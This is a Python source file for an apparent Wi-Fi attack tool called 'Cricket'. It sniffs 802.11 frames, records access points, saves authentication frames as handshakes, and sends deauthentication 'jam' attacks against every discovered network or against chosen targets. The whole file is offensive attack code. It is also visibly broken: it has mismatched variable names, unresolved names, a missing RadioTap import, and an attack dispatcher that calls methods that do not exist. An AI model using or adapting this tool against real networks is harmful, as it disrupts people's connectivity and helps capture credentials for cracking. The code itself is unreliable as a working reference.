#!/bin/python3
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Elt
from scapy.utils import PcapWriter

from time import sleep

from subprocess import Popen

import threading

import logging
logger = logging.getLogger(__name__)

from AP import AccessPoint

class Cricket():
	def __init__(self, ignoreBeacons, attackMode, sendint, recvint, output, searchingChannels, targets=[]):
		self.ignoreBeacons = ignoreBeacons
		self.attackMode = attackMode
		self.sendint = sendint
		self.recvint = recvint
		self.output = output
		self.searchingChannels = searchingChannels
		self.targets = targets

		self.handshakesFound = []
		self.discoveredAPs = []
		self.channelIndex = 0

	def changeChannel(self, new_channel, interface):
		command = ['iwconfig', interface, 'channel', newChannel]

		Popen(command, shell=False)

		logging.debug('Set channel to ' + newChannel + ' on ' + interface)

	def channelHop(self):
		# if the channel index is that of the last in the searchingChannels list, reset it to 0
		if self.channelIndex == len(searchingChannels) - 1:
			self.channelIndex = 0
		# otherwise, increment by 1
		else:
			self.channelIndex += 1
		# Then change channel
		self.changeChannel(self.channels[self.channelIndex], self.recvint)
		# These variables solely keep track of the channels we sniff on; it has no effect on any of the attacks

	def sniffPackets(self):
		packets = sniff(count = 10, iface=self.recvint)
		for packet in packets:
			# If the packet is a frame...
			if packet.haslayer(Dot11):
					# If the packet is a management frame
					if packet.type == 0:
						essid = bytes.decode(packet[Dot11Elt].info)
						bssid = packet.addr2
						# If the packet is a beacon frame
						if packet.subtype == 8:
							# If it isn't to be ignored
							if essid not in self.ignoreBeacons or bssid not in self.ignoreBeacons:
								# add bssid to discoveredAPs
								# create new AccessPoint class and append to targets
								# ensure we don't sniff further beacons by adding to ignoreBeacons
								channel = packet[RadioTap].Channel
								self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
								self.ignoreBeacons.append(bssid)
								logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
						# Elif the packet is an authentication frame
						elif packet.subtype == 11:
							# if a handshake hasn't been captured
							if bssid not in self.handshakesFound:
								# Note it's been captured and write to output file if one exists
								self.handshakesFound.append(bssid)
								if self.output:
									output.write(packet)
									logging.info('New Authentication Frame Found: ESSID = ' + essid)
					
					else:
						logging.debug('Found non-auth, non-beacon management frame')
			else:
				logging.debug('Found non-management frame transmission')
		self.channelHop()

	def sprayAttack(self):
		# Spray attacks every located target until it gets a handshake
		for AccessPoint in self.discoveredAPs:
			if AccessPoint.bssid not in self.handshakesFound:
				self.changeChannel(AccessPoint.channel, self.sendint)
				AccessPoint.jam(self.sendint)

	def unarmedAttack(self):
		# Do not send any deauth
		return

	def targetAttack(self):
		# Only deauth targets
		for AccessPoint in self.discoveredAPs:
			if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
				self.changeChannel(AccessPoint.channel, self.sendint)
				AccessPoint.jam(self.sendint)
	
	def attack(self):
		# All three attacks condensed into one single switch
		if self.attackMode == 'spray':
			self.spray()
		elif self.attackMode == 'unarmed':
			self.unarmed()
		elif self.attackMode == 'target':
			self.target()
		else:
			logging.debug('No attack mode set')

	def main(self):
		# thread this
		threading.Thread(target = self.sniffPackets).start()
		threading.Thread(target = self.attack).start()